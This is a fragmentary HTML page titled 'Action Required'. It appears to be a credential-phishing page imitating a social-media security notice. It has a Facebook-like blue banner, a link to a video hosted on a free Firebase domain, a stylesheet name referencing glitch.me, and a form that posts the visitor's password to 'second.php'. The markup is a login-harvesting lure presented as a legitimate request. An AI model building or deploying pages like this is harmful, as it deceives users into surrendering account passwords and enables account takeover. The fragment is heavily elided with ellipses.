...
<html><head>
  <title>Action Required</title>
    ...
    <link href="css/review-request-.glitch.me-style.css" rel="stylesheet">
</head>
...
<div class="md:block lg:block hidden border flex w-full h-[6rem]  relative bg-[#4667ac]">
  ...
  <form class="sm:hidden lg:block md:block" action="second.php" method="post">
...
<div>
  <a class="w-[120px] h-[80px] block mx-3" href="https://detailed-video-29b30.web.app/detailed%20video.mp4"><img src="images/cbf8be26-0413-4201-9418-b298e829656a-download%20(1).jfif" alt=""></a>
</div><div>
...
<div>
  <p class="text-slate-400 pl-4 mt-1">
   ...
   <p class="text-slate-400 pl-4 mt-1"> password </p>
          <input class="border h-6 pl-1 mx-3" type="password" name="password">
        </div>
